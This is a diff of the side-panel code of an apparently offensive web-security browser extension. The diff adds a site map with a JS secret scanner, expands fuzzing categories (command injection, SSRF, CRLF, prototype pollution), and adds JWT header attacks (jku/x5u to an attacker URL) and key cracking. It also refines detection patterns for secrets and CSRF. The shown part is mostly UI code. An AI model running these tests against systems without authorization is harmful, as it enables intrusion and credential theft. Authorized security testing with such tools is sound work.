+    : '<div class="text-xs text-muted mb-4">No authenticated session detected yet on this domain.</div>';
+
+  let html = `<div class="text-xs text-muted mb-4">Root domain: <code>${esc(root)}</code> · ${res.totalRequests} requests captured · ${hostList.length} host(s) · ${jsList.length} JS file(s) · ${epList.length} endpoint(s)</div>${authBanner}`;
+
+  // Action bar
+  html += `<div class="codec-row mb-6" style="flex-wrap:wrap;gap:4px">
+    <button class="btn-sm primary" id="sm-scan-js" ${unscanned === 0 ? 'disabled' : ''}>Scan ${unscanned} unscanned JS</button>
+    <button class="btn-sm" id="sm-export">Export JSON</button>
+    <button class="btn-sm" id="sm-clear">Clear Domain</button>
+  </div>`;
+
+  html += `<div id="sm-scan-out" style="display:none;margin-bottom:8px"></div>`;
+
+  // Hosts panel
+  html += `<div class="result-label mt-4 mb-4">Hosts seen (${hostList.length})</div>`;
+  hostList.forEach(([h, count]) => {
+    const isInScope = scopeDomains.length === 0 || scopeDomains.some(s => h === s || h.endsWith('.' + s));
+    html += `<div class="result-item ${isInScope ? 'info' : 'low'}" style="cursor:pointer">
+      <div class="result-label"><code>${esc(h)}</code> ${isInScope ? '' : '<span class="text-xs text-muted">(out of scope)</span>'}</div>
+      <div class="result-value text-xs">${count} requests</div>
+    </div>`;
+  });
+
+  // JS files panel
+  html += `<div class="result-label mt-6 mb-4">JS files (${jsList.length}) <span class="text-xs text-muted">— sorted by most recent</span></div>`;
+  if (!jsList.length) html += '<div class="text-muted text-sm">No JS files captured yet</div>';
+  jsList.slice(0, 50).forEach(([url, meta]) => {
+    let path; try { path = new URL(url).hostname + new URL(url).pathname; } catch { path = url; }
+    const sev = meta.scanned ? 'low' : 'info';
+    html += `<div class="result-item ${sev}" style="cursor:pointer">
+      <div class="result-label"><code style="font-size:9px">${esc(path).slice(0, 90)}</code></div>
+      <div class="result-value text-xs">${meta.scanned ? `✓ scanned (${meta.size||'?'}b)` : 'not scanned yet'} ${meta.status ? '· HTTP ' + meta.status : ''}</div>
+    </div>`;
+  });
+
+  // Endpoints tree
+  html += `<div class="result-label mt-6 mb-4">XHR / fetch endpoints by host</div>`;
+  const treeHosts = Object.keys(tree).sort();
+  if (!treeHosts.length) html += '<div class="text-muted text-sm">No XHR/fetch endpoints captured yet</div>';
+  treeHosts.forEach(h => {
+    const paths = Object.keys(tree[h]).sort();
+    html += `<details style="margin-bottom:6px;background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:6px"><summary class="text-sm" style="cursor:pointer;font-weight:600"><code>${esc(h)}</code> <span class="text-xs text-muted">(${paths.length} path${paths.length===1?'':'s'})</span></summary>`;
+    paths.forEach(p => {
+      const calls = tree[h][p];
+      const total = calls.reduce((s, c) => s + c.count, 0);
+      const methodSummary = [...new Set(calls.map(c => c.method))].join(',');
+      const lastStatus = calls.find(c => c.lastStatus)?.lastStatus || '';
+      html += `<div class="result-item info" style="cursor:pointer;margin-top:4px;padding:4px 6px" data-sm-ep="${esc(calls[0].url)}">
+        <div class="result-value text-xs"><span style="color:var(--accent);font-weight:600">${methodSummary}</span> ${esc(p).slice(0,80)} <span class="text-muted">${total}× ${lastStatus ? '· ' + lastStatus : ''}</span></div>
+      </div>`;
+    });
+    html += `</details>`;
+  });
+
+  b.innerHTML = html;
+
+  // Wire up actions
+  b.querySelector('#sm-scan-js')?.addEventListener('click', async () => {
+    const out = b.querySelector('#sm-scan-out');
+    out.style.display = 'block';
+    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning JS files for secrets…</div>';
+    const scan = await chrome.runtime.sendMessage({ type: 'SCAN_ALL_JS', domain: root });
+    if (!scan.ok) { out.innerHTML = errMsg(scan.error); return; }
+    // Run secret scanner on each fetched file
+    const findings = [];
+    for (const f of scan.files) {
+      if (!f.text) continue;
+      const fileFindings = scanSecretsInText(f.text, f.url);
+      findings.push(...fileFindings);
+    }
+    out.innerHTML = `<div class="result-item ${findings.length > 0 ? 'high' : 'info'}"><div class="result-label">Scanned ${scan.scanned} JS file${scan.scanned===1?'':'s'} (${scan.errors} failed${scan.remaining ? ', ' + scan.remaining + ' remaining' : ''})</div><div class="result-value">${findings.length} secret-pattern hit${findings.length===1?'':'s'}${findings.length ? '<br>' + findings.slice(0,10).map(f => `<code style="background:var(--surface-hover);padding:1px 4px;border-radius:2px;font-size:9px">${esc(f.name)}</code>: ${esc((f.match||'').slice(0,60))}…<br><span class="text-xs text-muted">${esc(f.source||'')}</span>`).join('<br>') : ''}</div></div>`;
+    log('Site Map: scanned ' + scan.scanned + ' JS files, ' + findings.length + ' secret hits', findings.length ? 'warn' : 'success');
+  });
+
+  b.querySelector('#sm-export')?.addEventListener('click', () => {
+    downloadText(JSON.stringify({ domain: root, ...res }, null, 2), 'cyboware-sitemap-' + root + '.json');
+  });
+  b.querySelector('#sm-clear')?.addEventListener('click', async () => {
+    if (!confirm('Clear all captured site-map data for ' + root + '? This cannot be undone.')) return;
+    await chrome.runtime.sendMessage({ type: 'CLEAR_DOMAIN_AGGREGATE', domain: root });
+    b.innerHTML = '<div class="text-muted text-sm">Cleared. Browse to repopulate.</div>';
+  });
+
+  finalizeResults('utility');
+}
+
+// Reusable helper for scan-text-with-pattern-list (used by Site Map's bulk scan)
+function scanSecretsInText(text, source) {
+  const findings = [];
+  for (const p of SECRET_PATTERNS) {
+    const re = new RegExp(p.regex.source, p.regex.flags);
+    let m, hits = 0;
+    while ((m = re.exec(text)) !== null && hits < 5) {
+      const v = m[1] || m[0];
+      if (v.length < 8) continue;
+      // FP filters
+      if (p.name === 'Generic Secret' && /placeholder|example|changeme|YOUR_|<.+>/i.test(v)) continue;
+      if (p.name === 'Bearer Token' && /YOUR_TOKEN|placeholder|<token>/i.test(v)) continue;
+      if (p.name === 'IP Address' && (v.startsWith('0.') || v.startsWith('127.') || v.startsWith('10.') || v.startsWith('192.168.') || v.startsWith('169.254.'))) continue;
+      findings.push({ name: p.name, match: v, severity: p.severity, source });
+      hits++;
+    }
+  }
+  return findings;
 }
 
 async function toolCors() {
   const b = showResults('offensive','CORS',false);
-  b.innerHTML=`<div class="tool-input-row mb-6"><input class="tool-input" id="cors-u" value="${esc(activeTabUrl)}"><button class="btn-sm primary" id="cors-go">Test 9 Origins</button></div><div id="cors-o"></div>`;
+  b.innerHTML=`<div class="tool-input-row mb-6"><input class="tool-input" id="cors-u" value="${esc(activeTabUrl)}"><button class="btn-sm primary" id="cors-go">Test 10 Origins</button></div><div id="cors-o"></div>`;
   b.querySelector('#cors-go').addEventListener('click', async () => {
     const url = b.querySelector('#cors-u').value, o = b.querySelector('#cors-o');
     o.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing CORS origins…</div>';
@@ -1512,9 +1823,16 @@ async function toolCors() {
     let preflightHtml = '';
     if (r.preflight) {
       const pf = r.preflight;
-      preflightHtml = `<div class="result-item ${pf.error ? 'info' : 'low'}" style="margin-bottom:8px"><div class="result-label">Preflight (OPTIONS)</div><div class="result-value">${pf.error ? 'Error: ' + esc(pf.error) : `Status: ${pf.status} | ACAO: ${esc(pf.acao || 'none')} | Methods: ${esc(pf.methods || 'none')}`}</div></div>`;
+      const maxAgeNote = pf.maxAge && +pf.maxAge > 86400 ? ` <span style="color:var(--warning)">(max-age=${pf.maxAge}s — long cache)</span>` : '';
+      preflightHtml = `<div class="result-item ${pf.error ? 'info' : 'low'}" style="margin-bottom:8px"><div class="result-label">Preflight (OPTIONS)</div><div class="result-value">${pf.error ? 'Error: ' + esc(pf.error) : `Status: ${pf.status} | ACAO: ${esc(pf.acao || 'none')} | Methods: ${esc(pf.methods || 'none')}${maxAgeNote}`}</div></div>`;
     }
-    o.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} tested</span><span class="text-sm ${criticals.length?'text-accent':''}" style="font-weight:700">${criticals.length} critical, ${vulns.length} reflected</span></div>${preflightHtml}` +
+    let varyHtml = '';
+    if (r.cachePoisonHint) {
+      varyHtml = `<div class="result-item medium" style="margin-bottom:8px"><div class="result-label"><span class="result-tag tag-medium">CACHE</span> Missing Vary: Origin</div><div class="result-value">CORS headers vary by Origin but the response lacks <code>Vary: Origin</code> — shared caches (CDN, proxy) may serve a cached CORS response to the wrong origin. Confirms CORS misconfig is exploitable for cross-origin reads.</div></div>`;
+    } else if (r.varyOrigin === true) {
+      varyHtml = `<div class="result-item info" style="margin-bottom:8px"><div class="result-label">Vary: Origin present</div><div class="result-value">Caches will key responses by Origin — good practice.</div></div>`;
+    }
+    o.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} tested</span><span class="text-sm ${criticals.length?'text-accent':''}" style="font-weight:700">${criticals.length} critical, ${vulns.length} reflected</span></div>${preflightHtml}${varyHtml}` +
       r.results.map(x => {
         const sev = x.critical ? 'high' : x.vuln ? 'medium' : x.wildcardOnly ? 'low' : 'info';
         return `<div class="result-item ${sev}">
@@ -1536,9 +1854,9 @@ async function toolRedirect() {
   const redirParams = ['url', 'redirect', 'redirect_uri', 'next', 'return', 'returnTo', 'goto', 'dest', 'destination', 'redir', 'return_url', 'continue', 'retUrl', 'forward', 'target'];
   const detected = [...u.searchParams.keys()].filter(k => redirParams.includes(k.toLowerCase()));
 
-  b.innerHTML = `<div class="text-sm mb-6">Active redirect testing with 12 bypass payloads</div>
+  b.innerHTML = `<div class="text-sm mb-6">Active redirect testing with 16 bypass payloads</div>
     <div class="tool-input-row"><input class="tool-input" id="rd-url" value="${esc(activeTabUrl)}" placeholder="URL with redirect param"></div>
-    <div class="tool-input-row"><input class="tool-input" id="rd-param" value="${esc(detected[0] || '')}" placeholder="Param name (e.g. redirect, next, return)" style="width:50%"><button class="btn-sm primary" id="rd-go">Test 12 Payloads</button></div>
+    <div class="tool-input-row"><input class="tool-input" id="rd-param" value="${esc(detected[0] || '')}" placeholder="Param name (e.g. redirect, next, return)" style="width:50%"><button class="btn-sm primary" id="rd-go">Test 16 Payloads</button></div>
     ${detected.length ? '<div class="text-xs mb-6" style="color:var(--success)">Auto-detected redirect param: ' + detected.map(esc).join(', ') + '</div>' : '<div class="text-xs text-muted mb-6">No redirect params auto-detected. Enter the param name manually.</div>'}
     <div id="rd-out"></div>`;
 
@@ -1547,7 +1865,7 @@ async function toolRedirect() {
     const param = b.querySelector('#rd-param').value.trim();
     const out = b.querySelector('#rd-out');
     if (!param) { out.innerHTML = '<div class="text-muted text-sm">Enter a redirect parameter name</div>'; return; }
-    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing 12 redirect payloads (authenticated)...</div>';
+    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing 16 redirect payloads (authenticated)...</div>';
     const r = await chrome.runtime.sendMessage({ type: 'TEST_REDIRECT', url, param });
     if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
     const vulns = r.results.filter(x => x.redirectsToEvil);
@@ -1629,20 +1947,25 @@ async function toolPassive() {
   const f = r?.data||[];
 
   // Additional checks from sidepanel
-  // CSRF: check forms
+  // CSRF: only flag forms with EXPLICIT method=post. HTML form default is GET (not POST),
+  // and the modern browser default for SameSite=Lax already mitigates most cross-origin POST CSRF.
+  // Severity is medium with caveat — confirming CSRF still requires manually checking SameSite cookie flags.
   try {
     const formRes = await msgTab({ type: 'EXTRACT_FORMS' });
     (formRes?.data || []).forEach(form => {
-      if (form.method?.toLowerCase() === 'post' || !form.method) {
+      const methodLower = (form.method || '').toLowerCase();
+      if (methodLower === 'post') {
         const hasCSRF = form.fields.some(fi => /csrf|_token|authenticity_token|__RequestVerification|_xsrf/i.test(fi.name));
         if (!hasCSRF && form.fields.length > 0) {
-          f.push({ severity: 'high', type: 'Missing CSRF Token', detail: `POST form (${form.fields.length} fields) → ${form.action || '(self)'} — no CSRF protection detected` });
+          f.push({ severity: 'medium', type: 'No CSRF token in POST form', detail: `POST form (${form.fields.length} fields) → ${form.action || '(self)'} — no token field detected. Verify SameSite cookie flag before reporting; modern browsers default to SameSite=Lax which blocks most cross-origin POST CSRF.` });
         }
       }
-      // Autocomplete on sensitive fields
+      // Autocomplete on credit card and SSN fields only — password autocomplete is fine (managers).
       form.fields.forEach(fi => {
-        if (['password','credit-card','cc-number','cvv','ssn'].includes(fi.type) || /password|card|cvv|ssn|credit/i.test(fi.name)) {
-          if (fi.autocomplete !== 'off') f.push({ severity: 'low', type: 'Autocomplete Enabled', detail: `Field "${fi.name}" (${fi.type}) allows autocomplete — PCI concern` });
+        const t = (fi.type || '').toLowerCase();
+        const name = fi.name || '';
+        if ((t === 'text' || t === 'tel' || !t) && /^(cc[-_]?num|card[-_]?num|credit[-_]?card|cvv|cvc|csc|ssn)/i.test(name)) {
+          if (fi.autocomplete !== 'off') f.push({ severity: 'low', type: 'Autocomplete on sensitive field', detail: `Field "${fi.name}" allows autocomplete — review against PCI-DSS / privacy requirements` });
         }
       });
     });
@@ -1656,11 +1979,12 @@ async function toolPassive() {
       if (!hd['x-frame-options'] && !(hd['content-security-policy']||'').includes('frame-ancestors')) {
         f.push({ severity: 'medium', type: 'Clickjacking', detail: 'No X-Frame-Options or CSP frame-ancestors — page can be embedded in iframe' });
       }
-      // Sensitive data in URL params
+      // Sensitive data in URL params — anchor exact param names to avoid false positives like ?key=apple, ?author=bob
       const u = new URL(activeTabUrl);
+      const SENSITIVE_PARAM = /^(password|passwd|pwd|api[_-]?key|apikey|access[_-]?token|auth[_-]?token|bearer|secret|ssn|credit[_-]?card|cvv|cvc|session[_-]?id)$/i;
       u.searchParams.forEach((v, k) => {
-        if (/password|token|secret|key|ssn|credit|auth/i.test(k)) {
-          f.push({ severity: 'medium', type: 'Sensitive URL Param', detail: `"${k}" in URL — leaks via Referer header and browser history` });
+        if (SENSITIVE_PARAM.test(k)) {
+          f.push({ severity: 'medium', type: 'Sensitive URL Param', detail: `"${k}" in URL — leaks via Referer header, browser history, and proxy logs` });
         }
       });
     }
@@ -1679,7 +2003,7 @@ async function toolWayback() {
   const r = await chrome.runtime.sendMessage({ type: 'WAYBACK_LOOKUP', url: activeTabUrl });
   if(!r.ok){b.innerHTML=errMsg(r.error);return}
   b.innerHTML=!r.snapshots.length?'<div class="text-muted text-sm">No snapshots</div>':`<div class="text-sm mb-6">${r.snapshots.length} snapshots</div>`+r.snapshots.map(s=>{const d=s[0].slice(0,4)+'-'+s[0].slice(4,6)+'-'+s[0].slice(6,8);return`<div class="result-item info"><a href="https://web.archive.org/web/${s[0]}/${s[1]}" target="_blank" style="color:var(--accent);text-decoration:none"><div class="result-label">${d}</div><div class="result-value">${esc(s[1]).slice(0,60)} (${s[2]})</div></a></div>`}).join('');
-  finalizeResults('discovery');
+  finalizeResults('recon');
 }
 
 function toolDiff() {
@@ -1722,7 +2046,7 @@ async function toolParamFuzz() {
 
   const renderUrlMode = () => {
     const mc = b.querySelector('#fz-mode-content');
-    mc.innerHTML = '<div class="tool-input-row"><input class="tool-input" id="fz-url" value="' + esc(activeTabUrl) + '" placeholder="Paste any URL with params to fuzz" style="font-size:10px"></div><div id="fz-param-area"></div><div class="codec-row mb-4"><button class="btn-sm primary" data-fzcat="xss">XSS</button><button class="btn-sm" data-fzcat="sqli">SQLi + Blind</button><button class="btn-sm" data-fzcat="ssti">SSTI</button><button class="btn-sm" data-fzcat="path">Path Traversal</button></div><details style="margin-bottom:8px"><summary class="text-xs text-muted" style="cursor:pointer">Custom payloads</summary><textarea class="tool-input mt-4" id="fz-custom" rows="3" placeholder="One payload per line"></textarea></details><div id="fz-out"></div>';
+    mc.innerHTML = '<div class="tool-input-row"><input class="tool-input" id="fz-url" value="' + esc(activeTabUrl) + '" placeholder="Paste any URL with params to fuzz" style="font-size:10px"></div><div id="fz-param-area"></div><div class="codec-row mb-4" style="flex-wrap:wrap"><button class="btn-sm primary" data-fzcat="xss">XSS</button><button class="btn-sm" data-fzcat="sqli">SQLi + Blind</button><button class="btn-sm" data-fzcat="nosqli">NoSQLi</button><button class="btn-sm" data-fzcat="ssti">SSTI</button><button class="btn-sm" data-fzcat="path">Path Traversal</button><button class="btn-sm" data-fzcat="cmdi">Command Inj.</button><button class="btn-sm" data-fzcat="ssrf">SSRF</button><button class="btn-sm" data-fzcat="proto">Proto Pollution</button><button class="btn-sm" data-fzcat="crlf">CRLF</button></div><details style="margin-bottom:8px"><summary class="text-xs text-muted" style="cursor:pointer">Custom payloads</summary><textarea class="tool-input mt-4" id="fz-custom" rows="3" placeholder="One payload per line"></textarea></details><div id="fz-out"></div>';
 
     // Render param checkboxes from URL
     const renderParamCheckboxes = (urlStr) => {
@@ -1779,7 +2103,7 @@ async function toolParamFuzz() {
       return;
     }
 
-    mc.innerHTML = '<div class="flex-between mb-6"><span class="text-sm">' + pageForms.length + ' form(s)</span><button class="btn-sm" id="fz-rescan">Re-scan</button></div><div id="fz-form-list"></div><div id="fz-form-detail" style="display:none;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)"><div class="result-label mb-4" id="fz-form-label">Selected form</div><div class="codec-row mb-4"><button class="btn-sm primary" data-ffcat="xss">XSS</button><button class="btn-sm" data-ffcat="sqli">SQLi + Blind</button><button class="btn-sm" data-ffcat="ssti">SSTI</button><button class="btn-sm" data-ffcat="path">Path Traversal</button></div><div id="fz-form-out"></div></div>';
+    mc.innerHTML = '<div class="flex-between mb-6"><span class="text-sm">' + pageForms.length + ' form(s)</span><button class="btn-sm" id="fz-rescan">Re-scan</button></div><div id="fz-form-list"></div><div id="fz-form-detail" style="display:none;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)"><div class="result-label mb-4" id="fz-form-label">Selected form</div><div class="codec-row mb-4" style="flex-wrap:wrap"><button class="btn-sm primary" data-ffcat="xss">XSS</button><button class="btn-sm" data-ffcat="sqli">SQLi + Blind</button><button class="btn-sm" data-ffcat="nosqli">NoSQLi</button><button class="btn-sm" data-ffcat="ssti">SSTI</button><button class="btn-sm" data-ffcat="path">Path Traversal</button><button class="btn-sm" data-ffcat="cmdi">Command Inj.</button><button class="btn-sm" data-ffcat="ssrf">SSRF</button><button class="btn-sm" data-ffcat="proto">Proto Pollution</button><button class="btn-sm" data-ffcat="crlf">CRLF</button></div><div id="fz-form-out"></div></div>';
 
     const listEl = mc.querySelector('#fz-form-list');
     pageForms.forEach((f, i) => {
@@ -2070,46 +2394,92 @@ async function toolStorage() {
   const ls = Object.entries(res.data.localStorage || {});
   const ss = Object.entries(res.data.sessionStorage || {});
   const jwtPattern = /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/;
+  const securityKeys = /token|jwt|auth|session|key|secret|password|credential|access|refresh|api/i;
+
+  // Helper: try to decode a value as base64→JSON, or detect raw JSON, or compute entropy
+  const decodePreview = (v) => {
+    if (!v || typeof v !== 'string') return null;
+    // Raw JSON
+    if ((v.startsWith('{') && v.endsWith('}')) || (v.startsWith('[') && v.endsWith(']'))) {
+      try { const parsed = JSON.parse(v); return { kind: 'JSON', data: JSON.stringify(parsed, null, 2).slice(0, 400) }; } catch {}
+    }
+    // base64-encoded JSON
+    if (/^[A-Za-z0-9+/=]{12,}$/.test(v) && v.length % 4 === 0) {
+      try {
+        const decoded = atob(v);
+        if ((decoded.startsWith('{') && decoded.endsWith('}')) || (decoded.startsWith('[') && decoded.endsWith(']'))) {
+          try { const parsed = JSON.parse(decoded); return { kind: 'base64→JSON', data: JSON.stringify(parsed, null, 2).slice(0, 400) }; } catch {}
+        }
+        // base64-encoded printable text
+        if (/^[\x20-\x7e\s]+$/.test(decoded) && decoded.length > 4) return { kind: 'base64→text', data: decoded.slice(0, 200) };
+      } catch {}
+    }
+    return null;
+  };
+
+  // Shannon entropy — flag low-entropy session values (predictable)
+  const entropy = (s) => {
+    if (!s) return 0;
+    const freq = {};
+    for (const c of s) freq[c] = (freq[c] || 0) + 1;
+    let ent = 0;
+    for (const c in freq) { const p = freq[c] / s.length; ent -= p * Math.log2(p); }
+    return ent;
+  };
+
+  const renderItem = (storage, k, v) => {
+    const isJwt = jwtPattern.test(v);
+    const isSecurity = securityKeys.test(k);
+    const decoded = decodePreview(v);
+    let entropyNote = '';
+    if (isSecurity && v && v.length > 8 && !isJwt) {
+      const e = entropy(v);
+      if (e < 3.0) entropyNote = `<div class="text-xs" style="color:var(--warning)">⚠ Low entropy (${e.toFixed(1)} bits/char) — predictable / sequential / weak</div>`;
+      else if (e > 4.5) entropyNote = `<div class="text-xs text-muted">Entropy ${e.toFixed(1)} bits/char (high)</div>`;
+    }
+    return `<div class="result-item ${isJwt ? 'high' : isSecurity ? 'medium' : 'info'}" data-st-search="${esc(k.toLowerCase() + ' ' + (v||'').toLowerCase())}" style="cursor:pointer">
+      <div class="result-label">${isJwt ? '🎟 ' : isSecurity ? '🔑 ' : ''}${esc(k)}</div>
+      <div class="result-value" style="font-size:9.5px;word-break:break-all">${esc((v || '').slice(0, 120))}${(v || '').length > 120 ? '…' : ''}</div>
+      ${isJwt ? '<div class="text-xs text-accent">JWT detected — use JWT Editor to decode</div>' : ''}
+      ${entropyNote}
+      ${decoded ? `<details style="margin-top:4px"><summary class="text-xs" style="color:var(--accent);cursor:pointer">Decoded as ${decoded.kind}</summary><pre class="text-xs" style="white-space:pre-wrap;background:var(--surface-hover);padding:4px;border-radius:3px;margin-top:3px;font-size:9px">${esc(decoded.data)}</pre></details>` : ''}
+    </div>`;
+  };
 
   let html = `<div class="text-xs text-muted mb-4">Page: ${esc(activeTabUrl)}</div>`;
-  // Flag JWTs and interesting keys
-  const securityKeys = /token|jwt|auth|session|key|secret|password|credential|access|refresh|api/i;
+  if (ls.length || ss.length) {
+    html += `<div class="tool-input-row mb-4"><input class="tool-input" id="st-search" placeholder="Filter by key or value…" style="font-size:10px"></div>`;
+  }
 
   if (ls.length) {
     html += `<div class="result-label mt-4 mb-4">localStorage (${ls.length})</div>`;
-    ls.forEach(([k, v]) => {
-      const isJwt = jwtPattern.test(v);
-      const isSecurity = securityKeys.test(k);
-      html += `<div class="result-item ${isJwt ? 'high' : isSecurity ? 'medium' : 'info'}" style="cursor:pointer">
-        <div class="result-label">${isJwt ? '🎟 ' : isSecurity ? '🔑 ' : ''}${esc(k)}</div>
-        <div class="result-value" style="font-size:9.5px;word-break:break-all">${esc((v || '').slice(0, 120))}</div>
-        ${isJwt ? '<div class="text-xs text-accent">JWT detected — use JWT Editor to decode</div>' : ''}
-      </div>`;
-    });
+    ls.forEach(([k, v]) => { html += renderItem('localStorage', k, v); });
   }
   if (ss.length) {
     html += `<div class="result-label mt-6 mb-4">sessionStorage (${ss.length})</div>`;
-    ss.forEach(([k, v]) => {
-      const isJwt = jwtPattern.test(v);
-      const isSecurity = securityKeys.test(k);
-      html += `<div class="result-item ${isJwt ? 'high' : isSecurity ? 'medium' : 'info'}" style="cursor:pointer">
-        <div class="result-label">${isJwt ? '🎟 ' : isSecurity ? '🔑 ' : ''}${esc(k)}</div>
-        <div class="result-value" style="font-size:9.5px;word-break:break-all">${esc((v || '').slice(0, 120))}</div>
-        ${isJwt ? '<div class="text-xs text-accent">JWT detected — use JWT Editor to decode</div>' : ''}
-      </div>`;
-    });
+    ss.forEach(([k, v]) => { html += renderItem('sessionStorage', k, v); });
   }
   if (!ls.length && !ss.length) html += '<div class="text-muted text-sm">No data in localStorage or sessionStorage</div>';
   else {
     html += `<div class="tool-input-row mt-6"><button class="btn-sm" id="st-copy">Copy All</button><button class="btn-sm" id="st-json">Copy JSON</button></div>`;
   }
   b.innerHTML = html;
+
+  // Wire search filter
+  const search = b.querySelector('#st-search');
+  search?.addEventListener('input', () => {
+    const q = search.value.toLowerCase();
+    b.querySelectorAll('[data-st-search]').forEach(el => {
+      el.style.display = !q || el.dataset.stSearch.includes(q) ? '' : 'none';
+    });
+  });
+
   b.querySelector('#st-copy')?.addEventListener('click', () => {
     const lines = [...ls.map(([k,v]) => `[localStorage] ${k} = ${v}`), ...ss.map(([k,v]) => `[sessionStorage] ${k} = ${v}`)];
     copyText(lines.join('\n'));
   });
   b.querySelector('#st-json')?.addEventListener('click', () => copyText(JSON.stringify(res.data, null, 2)));
-  finalizeResults('discovery');
+  finalizeResults('clientdata');
 }
 
 // ═══ CSP EVALUATOR ═══
@@ -2160,7 +2530,7 @@ async function toolTakeover() {
   if (!r.ok) { b.innerHTML = errMsg(r.error); return; }
   if (!r.results.length) {
     b.innerHTML = `<div class="text-muted text-sm">No dangling CNAMEs found across ${subs.length} subdomains</div>`;
-    finalizeResults('discovery'); return;
+    finalizeResults('recon'); return;
   }
   const vulns = r.results.filter(x => x.vulnerable);
   b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} CNAME matches, <span class="${vulns.length?'text-accent':'text-muted'}" style="font-weight:700">${vulns.length} potentially vulnerable</span></span></div>` +
@@ -2171,14 +2541,14 @@ async function toolTakeover() {
       ${x.errorType === 'TIMEOUT' ? '<div class="text-xs text-muted">Timeout — weak signal, likely not takeover</div>' : ''}
       ${x.errorType === 'DNS_NXDOMAIN' ? '<div class="text-xs text-accent">DNS does not resolve — strong takeover signal!</div>' : ''}
     </div>`).join('');
-  finalizeResults('discovery');
+  finalizeResults('recon');
   log(`Takeover: ${vulns.length} vulnerable of ${r.results.length} checked`, vulns.length ? 'warn' : 'success');
 }
 
 // ═══ 403 BYPASS TESTER ═══
 async function tool403Bypass() {
   const b = showResults('offensive', '403 Bypass', true);
-  b.innerHTML = `<div class="tool-input-row mb-6"><input class="tool-input" id="bp-url" value="${esc(activeTabUrl)}"><button class="btn-sm primary" id="bp-go">Test 17 Bypasses</button></div><div id="bp-out"></div>`;
+  b.innerHTML = `<div class="tool-input-row mb-6"><input class="tool-input" id="bp-url" value="${esc(activeTabUrl)}"><button class="btn-sm primary" id="bp-go">Test 25 Bypasses</button></div><div id="bp-out"></div>`;
   b.querySelector('#bp-go').addEventListener('click', async () => {
     const out = b.querySelector('#bp-out');
     out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing bypass techniques…</div>';
@@ -2201,11 +2571,11 @@ async function tool403Bypass() {
 // ═══ HTTP METHOD TESTER ═══
 async function toolMethodTest() {
   const b = showResults('offensive', 'Method Tester', false);
-  b.innerHTML = `<div class="tool-input-row mb-6"><input class="tool-input" id="mt-url" value="${esc(activeTabUrl)}" placeholder="URL to test"><button class="btn-sm primary" id="mt-go">Test 8 Methods</button></div><div id="mt-out"></div>`;
+  b.innerHTML = `<div class="tool-input-row mb-6"><input class="tool-input" id="mt-url" value="${esc(activeTabUrl)}" placeholder="URL to test"><button class="btn-sm primary" id="mt-go">Test 7 Methods</button></div><div id="mt-out"></div>`;
   const runTest = async () => {
     const url = b.querySelector('#mt-url').value;
     const out = b.querySelector('#mt-out');
-    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing 8 HTTP methods (authenticated)...</div>';
+    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing 7 HTTP methods (authenticated)...</div>';
     const r = await chrome.runtime.sendMessage({ type: 'METHOD_TEST', url });
     if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
     const baseline = r.results[0];
@@ -2214,14 +2584,14 @@ async function toolMethodTest() {
         let sev = 'info', verdict = '';
         if (x.error) { sev = 'info'; verdict = x.error; }
         else if (x.baseline) { verdict = 'Baseline reference'; }
-        else if (x.traceEcho) { sev = 'high'; verdict = 'TRACE echoes request headers back — XST (Cross-Site Tracing) possible!'; }
+        else if (x.traceListed) { sev = 'medium'; verdict = x.note; }
         else if (x.realDanger) { sev = 'high'; verdict = `${x.method} returns DIFFERENT response (${x.bodyDiff}b diff) — likely processed! Investigate.`; }
         else if (x.fakeAccept) { sev = 'info'; verdict = `Same page as GET (${x.bodyDiff}b) — server ignores method, not a real finding`; }
         else if (x.status === 405) { verdict = 'Method not allowed (expected)'; }
         else if (x.status !== baseline.status) { sev = 'low'; verdict = `Different status than GET (${baseline.status})  — worth investigating`; }
         else { verdict = 'Same as GET'; }
         return `<div class="result-item ${sev}">
-          <div class="result-label"><span class="result-tag tag-${sev === 'high' ? 'high' : sev === 'low' ? 'low' : 'info'}">${x.status}</span> ${x.method}</div>
+          <div class="result-label"><span class="result-tag tag-${sev === 'high' ? 'high' : sev === 'medium' ? 'medium' : sev === 'low' ? 'low' : 'info'}">${x.status}</span> ${x.method}</div>
           <div class="result-value">${x.bodyLen !== undefined ? x.bodyLen + 'b' : ''} ${x.allow ? '· Allow: ' + esc(x.allow) : ''}</div>
           <div class="text-xs" style="color:var(--text-secondary)">${verdict}</div>
           ${x.preview ? `<div style="margin-top:4px;padding:4px 6px;background:var(--danger-soft);border-radius:3px;font-family:var(--font-mono);font-size:9px;max-height:50px;overflow:auto">${esc(x.preview)}</div>` : ''}
@@ -2292,6 +2662,23 @@ function toolJwtEditor() {
           <button class="btn-sm jwt-he" data-he="kid-path">kid path traversal</button>
           <button class="btn-sm jwt-he" data-he="kid-empty">kid empty string</button>
         </div>
+        <div class="codec-row mb-4">
+          <button class="btn-sm jwt-he" data-he="jku">jku → attacker URL</button>
+          <button class="btn-sm jwt-he" data-he="jwk-embed">jwk embedded key</button>
+          <button class="btn-sm jwt-he" data-he="x5u">x5u → attacker URL</button>
+          <button class="btn-sm jwt-he" data-he="crit">crit ignored claim</button>
+        </div>
+        <div class="text-xs text-muted mb-4" style="line-height:1.4">
+          <strong>jku/x5u</strong> point at an attacker-controlled JSON Web Key Set or X.509 cert (CVE-2018-0114 family).
+          <strong>jwk</strong> embeds a public key in the header — vulnerable libs use it to verify (key confusion).
+          <strong>crit</strong> declares an extension header the lib must understand; some libs ignore the requirement.
+        </div>
+        <div class="result-label mt-4 mb-4">Crack HS256/384/512 (offline)</div>
+        <div class="codec-row mb-4">
+          <button class="btn-sm primary" id="jwt-crack">▶ Try common keys</button>
